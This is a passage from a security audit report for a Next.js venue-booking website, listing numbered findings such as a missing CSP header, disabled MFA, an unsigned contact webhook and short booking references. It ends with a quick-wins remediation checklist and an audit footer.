| 4 | Public booking POST `/api/calendar/bookings`: Cloudflare Turnstile + ~~length caps~~ now in place; remaining gap is no per-IP WAF rate limit at the edge. Email-bomb the admin / Resend cost amplification still partially open. ~~**Length caps fixed 2026-05-19.**~~ | A04 | **Medium** | Low | Hunt, Schneier |
| 5 | ~~PaymentEntry net-collected calculation subtracts every non-`payment` type, including `waiver` ([payments/route.ts:75–80](src/app/api/admin/calendar/bookings/[id]/payments/route.ts#L75-L80)). Mismatch between the schema doc model (waiver reduces *outstanding*) and the code behaviour (waiver reduces *paidAmountLkr*). Touches money.~~ **Fixed 2026-05-19** — see Remediation log. | — | **Medium** | Low | Kettle |
| 6 | No CSP header in [`next.config.ts`](next.config.ts) or middleware. HSTS / X-Frame / X-Content / Referrer / Permissions are all set — CSP is the conspicuous absence. Future EmailLog-render XSS would be uncontained. | A05 | **Medium** | Low | Tabriz |
| 7 | Cognito MFA off (documented in `CLAUDE.md`); also `EMAIL` alias-attribute uniqueness on the user pool not enforced in code — relies on the user-pool configuration. `cognitoSub` backfill is trust-on-first-use. | A07 | **Medium** | Low | Hunt, Tabriz |
| 8 | `/api/contact` accepts unauthenticated POST and forwards to `CONTACT_WEBHOOK_URL` without HMAC or signing. No timeout on the outbound fetch. | A08 / A04 | **Medium** | Low | Tabriz, Kettle |
| 9 | Booking reference is 3 random bytes (24 bits) ([bookings/route.ts:40–42](src/app/api/calendar/bookings/route.ts#L40-L42)). At ~10 k bookings, ~1 % birthday-bound collision probability; collision returns 500 to the customer. No retry-on-conflict. | — | **Low** | Low | Kettle |
| 10 | `CONTACT_WEBHOOK_URL` is read at runtime but not added to the `_AMPLIFY_*` baking list in `next.config.ts` — may silently fall to the dev branch in production. | — | **Medium** | Low | Schneier |
| 11 | `cachedLogoutEndpoint` module-scope cache in [`federated-logout/route.ts:5`](src/app/api/auth/federated-logout/route.ts#L5) defeats the `cache: "no-store"` fetch and never refreshes within a Lambda lifetime. | — | **Low** | Low | Kettle |
| 12 | No length caps on customer fields (`name`, `email`, `phone`, `purpose`) in the public POST. Combined with no rate limit → DB-filler attack possible. | A04 | **Low** | Low | Kettle |
| 13 | `EmailLog.htmlBody` stores full rendered customer-PII HTML indefinitely. No retention policy; no GDPR/PDPA delete flow. | — | **Medium** | Medium | Schneier |
| 14 | Resend default `FROM = "onboarding@resend.dev"` until domain verified — emails fail DMARC alignment for `royalmasarena.lk`; deliverability silently degraded; `EmailLog.status='sent'` is misleading. | — | **Low** | Medium | Hunt |
| 15 | `wipe-and-recreate` calendar transaction runs ~5 round-trips per booking on Neon Singapore → 30 s timeout will start firing at moderate data volumes. Availability becomes a security issue when admins start retrying / double-submitting. | — | **Medium** | High | Kettle |
| 16 | `GET /api/admin/calendar/bookings` returns all bookings + slots + breakdown + payments unpaginated. | — | **Low** | Medium | Tabriz |
| 17 | No explicit `Origin` check on admin state-changing routes; relies on SameSite=Lax + JSON preflight only. Future subdomain content widens the CSRF surface. | A01 | **Low** | Low | Kettle |
| 18 | `x-forwarded-for` consumed directly in `logAuditEvent` without trim/validation. Cosmetic for admin routes but worth documenting. | — | **Low** | Low | Kettle |
| 19 | No `npm audit --production` / Dependabot / Renovate evident in CI config. Pin dependencies; track NextAuth version branch. | A06 | **Low** | Low | Schneier |
| 20 | 4 h session `maxAge` is long for admins handling financial actions; combined with `updateAge: 15 min` it auto-renews indefinitely on activity. | — | **Low** | Low | Schneier |

---

## Quick-Wins Checklist (≤1 day each)

1. **Add an `esc()` helper in [`email.ts`](src/lib/email.ts) and wrap every
   user/admin-supplied interpolation.** Closes #1. ~30 minutes including test.

2. **Re-read role/active from Postgres inside `requireAdmin` / `requireSuperAdmin`** (or
   in the NextAuth `session` callback) and reject if the user is `active: false` or the
   stamped role no longer matches. Closes #2 in the simplest form.

3. **Add length caps on customer fields in `POST /api/calendar/bookings`** —
   name ≤ 100, email ≤ 254, phone ≤ 40, purpose ≤ 1000. Closes #12 and reduces #4
   exposure.

4. **Add a honeypot field** (hidden `<input name="company">` in the booking form, reject
   filled submissions server-side) — catches naive bots immediately. Two lines of code.

5. **Add a CSP header to [`next.config.ts`](next.config.ts)** matching the policy in
   Part 8. Closes #6.

6. **Retry once on Prisma `P2002` (reference collision) in the booking POST.** Closes #9.

7. **Add `signal: AbortSignal.timeout(5_000)` to the `fetch()` in
   [`contact/route.ts:49`](src/app/api/contact/route.ts#L49).** Closes the slow-webhook
   half of #8; sign the body with HMAC for the rest.

8. **Verify `CONTACT_WEBHOOK_URL` is reaching production** — either bake via
   `_AMPLIFY_CONTACT_WEBHOOK_URL` in `next.config.ts` (and update the prebuild allowlist),
   or confirm Amplify is passing it through. Closes #10.

9. **Replace the `EmailLog.htmlBody` column with a structured `payload jsonb`** (or stop
   storing the full HTML; store the subject + a fingerprint). Removes the latent
   XSS-on-render and the PII retention concern. Closes #13 partially; full GDPR delete
   flow is a separate work item.

10. **Add WAF rate-limit rule on `/api/calendar/bookings` and `/api/contact`** at the
    Amplify / CloudFront layer — 5 req/min per IP. Closes the rest of #4. No code change.

---

*Audit conducted on 2026-05-18 against the RMASA Website repository (branch: `main`).
Re-run after any change to `src/lib/auth.ts`, `src/lib/email.ts`, `src/lib/calendar-store.ts`,
or the introduction of any AI feature.*
